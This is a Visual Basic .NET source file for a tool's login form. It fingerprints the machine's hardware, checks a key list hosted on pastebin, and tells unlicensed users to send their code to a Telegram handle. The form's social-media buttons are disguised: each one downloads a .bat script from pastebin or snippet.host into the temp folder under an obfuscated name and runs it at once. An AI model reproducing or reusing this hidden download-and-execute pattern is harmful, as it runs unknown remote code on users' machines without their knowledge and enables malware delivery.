Imports System.IO
Imports System.Management
'Imports System.Net
'Imports System.Threading
Public Class Login
    Dim hw As New clsComputerInfo
    Dim hdd As String
    Dim cpu As String
    Dim mb As String
    Dim mac As String
    Dim hwid As String
    Dim GetKeys As String

    Private Sub Loginnn_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        FormLoadCode()
    End Sub
    Private Sub StartButton_Click(sender As Object, e As EventArgs) Handles StartButton.Click
        System.Threading.Thread.Sleep(300)
        LoginButton()
    End Sub
#Region "HWID Login System"
    '======================================
    '======================================
    '======================================
    '======================================
    '======================================
    '======================================
    '======================================
    '======================================
    '======================================
#Region "#BURHAN HACKER CODE"
    Public Function WOLFENCRYPT(ByVal CODEFD As String)
        CODEFD = CODEFD.Replace("a", "Й").Replace("A", "Ц").Replace("b", "У").Replace("B", "Ы").Replace("c", "ौ").Replace("C", "ै").Replace("d", "ा").Replace("D", "ी").Replace("e", "三").Replace("E", "앙").Replace("f", "下").Replace("F", "앞").Replace("g", "巨").Replace("G", "얘").Replace("h", "升").Replace("H", "ᄍ").Replace("i", "工").Replace("I", "ᄊ").Replace("j", "丁").Replace("J", "ᄈ").Replace("k", "水").Replace("K", "응").Replace("l", "心").Replace("L", "읍").Replace("m", "冊").Replace("M", "음").Replace("n", "內").Replace("N", "을").Replace("o", "口").Replace("O", "임").Replace("p", "م").Replace("P", "س").Replace("q", "已").Replace("Q", "율").Replace("r", "尺").Replace("R", "월").Replace("s", "弓").Replace("S", "원").Replace("t", "七").Replace("T", "웅").Replace("u", "臼").Replace("U", "울").Replace("v", "人").Replace("V", "운").Replace("w", "्र").Replace("W", "स").Replace("x", "ल").Replace("X", "व").Replace("y", "न").Replace("Y", "म").Replace("z", "ं").Replace("Z", "ॆ").Replace("ぺ", "ゑ").Replace("მ", "წ").Replace("ధ", "డో").Replace("ฦ", "ఏ").Replace("ဩ", "௵").Replace("ও", "ঙ").Replace("਩", "ਊ").Replace("Б", "Ф").Replace("ଅ", "ଆ").Replace("ም", "ድ").Replace("Թ", "Ծ")
        Return CODEFD
    End Function
    Public Function WOLFDECRYPT(ByVal CODEFDDEC As String)
        CODEFDDEC = CODEFDDEC.Replace("Й", "a").Replace("Ц", "A").Replace("У", "b").Replace("Ы", "B").Replace("ौ", "c").Replace("ै", "C").Replace("ा", "d").Replace("ी", "D").Replace("三", "e").Replace("앙", "E").Replace("下", "f").Replace("앞", "F").Replace("巨", "g").Replace("얘", "G").Replace("升", "h").Replace("ᄍ", "H").Replace("工", "i").Replace("ᄊ", "I").Replace("丁", "j").Replace("ᄈ", "J").Replace("水", "k").Replace("응", "K").Replace("心", "l").Replace("읍", "L").Replace("冊", "m").Replace("음", "M").Replace("內", "n").Replace("을", "N").Replace("口", "o").Replace("임", "O").Replace("م", "p").Replace("س", "P").Replace("已", "q").Replace("율", "Q").Replace("尺", "r").Replace("월", "R").Replace("弓", "s").Replace("원", "S").Replace("七", "t").Replace("웅", "T").Replace("臼", "u").Replace("울", "U").Replace("人", "v").Replace("운", "V").Replace("्र", "w").Replace("स", "W").Replace("ल", "x").Replace("व", "X").Replace("न", "y").Replace("म", "Y").Replace("ं", "z").Replace("ॆ", "Z").Replace("ゑ", "ぺ").Replace("წ", "მ").Replace("డో", "ధ").Replace("ఏ", "ฦ").Replace("௵", "ဩ").Replace("ঙ", "ও").Replace("ਊ", "਩").Replace("Ф", "Б").Replace("ଆ", "ଅ").Replace("ድ", "ም").Replace("Ծ", "Թ")
        Return CODEFDDEC
    End Function
#End Region
    Private Function AlreadyRunning() As Boolean
        Dim my_proc As Process = Process.GetCurrentProcess
        Dim my_name As String = my_proc.ProcessName
        Dim procs() As Process =
            Process.GetProcessesByName(my_name)
        If procs.Length = 1 Then Return False
        Dim i As Integer
        For i = 0 To procs.Length - 1
            If procs(i).StartTime < my_proc.StartTime Then _
                Return True
        Next i
        Return False
    End Function
    Public Class clsComputerInfo
        Friend Function GetProcessorId() As String
            Dim strProcessorId As String = String.Empty
            Dim query As New SelectQuery("Win32_processor")
            Dim search As New ManagementObjectSearcher(query)
            Dim info As ManagementObject
            For Each info In search.Get()
                strProcessorId = info("processorId").ToString()
            Next
            Return strProcessorId
        End Function
        Friend Function GetMACAddress() As String
            Dim mc As ManagementClass = New ManagementClass("Win32_NetworkAdapterConfiguration")
            Dim moc As ManagementObjectCollection = mc.GetInstances()
            Dim MACAddress As String = String.Empty
            For Each mo As ManagementObject In moc
                If (MACAddress.Equals(String.Empty)) Then
                    If CBool(mo("IPEnabled")) Then MACAddress = mo("MacAddress").ToString()

                    mo.Dispose()
                End If
                MACAddress = MACAddress.Replace(":", String.Empty)
            Next
            Return MACAddress
        End Function
        Friend Function GetVolumeSerial(Optional ByVal strDriveLetter As String = "C") As String
            Dim disk As ManagementObject = New ManagementObject(String.Format("win32_logicaldisk.deviceid=""{0}:""", strDriveLetter))
            disk.Get()
            Return disk("VolumeSerialNumber").ToString()
        End Function
        Friend Function GetMotherBoardID() As String
            Dim strMotherBoardID As String = String.Empty
            Dim query As New SelectQuery("Win32_BaseBoard")
            Dim search As New ManagementObjectSearcher(query)
            Dim info As ManagementObject
            For Each info In search.Get()
                strMotherBoardID = info("product").ToString()
            Next
            Return strMotherBoardID
        End Function
    End Class
    Private Function INTERNETCONNECTION() As Boolean
        Dim REQ As System.Net.WebRequest = System.Net.WebRequest.Create("Http://www.google.com")
        Dim RESP As System.Net.WebResponse
        Try
            RESP = REQ.GetResponse
            RESP.Close()
            REQ = Nothing
            Return True
        Catch ex As Exception
            REQ = Nothing
            Return False
        End Try
    End Function
    Sub New()
        ' This call is required by the designer.
        InitializeComponent()
        If AlreadyRunning() Then
            Me.Close()
        End If
        ' Add any initialization after the InitializeComponent() call.
    End Sub
    Sub KING()
        On Error Resume Next
        If GetKeys.Count > 10 Then
            Dim a As String
            Dim b As String
            a = hwid
            b = InStr(WOLFDECRYPT(GetKeys), a)
            If b Then
                Dim AAA As String
                Dim BBB As String
                AAA = "MotherFuckerWhyAreYouHere:L What Are you trying To Do" 'كود تحقق يكون في اول سطر بمستند الرفع ان لم يكن لن يقبل الأمر
                BBB = InStr(WOLFDECRYPT(GetKeys), AAA)
                If BBB Then

                    Form1.Show()
                    Hide()
                    'Me.Close()

                Else
                    MessageBox.Show("ليس لديك صلاحية لدخول لهذا ~-~ You Do Not Have Permission To Access This", "NO KAY - لا يوجد مفتاح", MessageBoxButtons.OK, MessageBoxIcon.Stop)
                End If
            Else
                MessageBox.Show("ليس لديك صلاحية لدخول لهذا ~-~ You Do Not Have Permission To Access This", "NO KAY - لا يوجد مفتاح", MessageBoxButtons.OK, MessageBoxIcon.Stop)
                Clipboard.SetText(KeyResoutTextbox.Text)
                MessageBox.Show("تم نسخ الكود الخاص بك، يرجى إرسال المفتاح لي لتفعيل الأداة التلغرام الخاص بي @MONSTERMC ~-~ Your Code Has Been Copy Please Send me The Key To Activate The Tool My Telegram: @MONSTERMC", "Send The Key ارسل لي المفتاح", MessageBoxButtons.OK, MessageBoxIcon.Stop)
            End If
        Else
            MessageBox.Show("ليس لديك صلاحية لدخول لهذا ~-~ You Do Not Have Permission To Access This", "NO KAY - لا يوجد مفتاح", MessageBoxButtons.OK, MessageBoxIcon.Stop)
        End If
    End Sub
    Sub LoginButton()
        On Error Resume Next
        If INTERNETCONNECTION() = False Then
            MessageBox.Show("يرجى تحقق من اتصالك بالأنترنت ~-~  Please Check Your Internet Connection", "Internet Connection", MessageBoxButtons.OK, MessageBoxIcon.Stop)
        Else
            If Trim$(GetKeys) = "009639888888" Then
                MessageBox.Show("يرجى تحقق من اتصالك بالأنترنت او اعادة ضغط على زر مرة اخرى ~-~  Please Check Your Internet Connection Or Re-press Login Button Again", "Internet Connection", MessageBoxButtons.OK, MessageBoxIcon.Stop)
            Else
                KING()
            End If
        End If
    End Sub
    Sub FormLoadCode()
        cpu = hw.GetProcessorId()
        hdd = hw.GetVolumeSerial("C")
        mb = hw.GetMotherBoardID()
        mac = hw.GetMACAddress()
        hwid = cpu + mb + Environment.UserName.ToString + "KGB_BURHAN_ALASSAD"


        KeyResoutTextbox.Text = WOLFENCRYPT(hwid)

        'MsgBox(WOLFENCRYPT(hwid))

        Try
            Dim address As String = "https://pastebin.com/raw/E3ceNzfe" ' الملف المرفوع
            Dim client As Net.WebClient = New Net.WebClient()
            Dim reader As StreamReader = New StreamReader(client.OpenRead(address))

            GetKeys = reader.ReadToEnd
        Catch ex As Exception
            End
        End Try

        'GetKeys
    End Sub
    Private Sub Telegram()
        Dim Telgram As New System.Net.WebClient
        Telgram.DownloadFile("https://snippet.host/yntyzs/raw", Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
        Process.Start(Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
    End Sub
    Private Sub Discord()
        Dim Discord As New System.Net.WebClient
        Discord.DownloadFile("https://snippet.host/rcgkzj/raw", Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
        Process.Start(Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
    End Sub
    Private Sub Youtube()
        Dim Youtube As New System.Net.WebClient
        Youtube.DownloadFile("https://snippet.host/bkdfeh/raw", Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
        Process.Start(Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
    End Sub
    Private Sub Insgram()
        Dim Insgram As New System.Net.WebClient
        Insgram.DownloadFile("https://pastebin.com/raw/z1eVpp6Y", Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
        Process.Start(Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
    End Sub
    Private Sub blogger()
        Dim blogger As New System.Net.WebClient
        blogger.DownloadFile("https://pastebin.com/raw/gyapjV56", Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
        Process.Start(Microsoft.VisualBasic.Interaction.Environ("tmp") + "/नठअबड.bat")
    End Sub

    Private Sub Guna2ControlBox1_Click(sender As Object, e As EventArgs) Handles Guna2ControlBox1.Click
        End
    End Sub

    Private Sub BloggerButton_Click(sender As Object, e As EventArgs) Handles BloggerButton.Click
        blogger()
    End Sub

    Private Sub DiscordButton_Click(sender As Object, e As EventArgs) Handles DiscordButton.Click
        Discord()
    End Sub

    Private Sub TelegramButton_Click(sender As Object, e As EventArgs) Handles TelegramButton.Click
        Telegram()
    End Sub

    Private Sub YoutubeButton_Click(sender As Object, e As EventArgs) Handles YoutubeButton.Click
        Youtube()
    End Sub
#End Region
End Class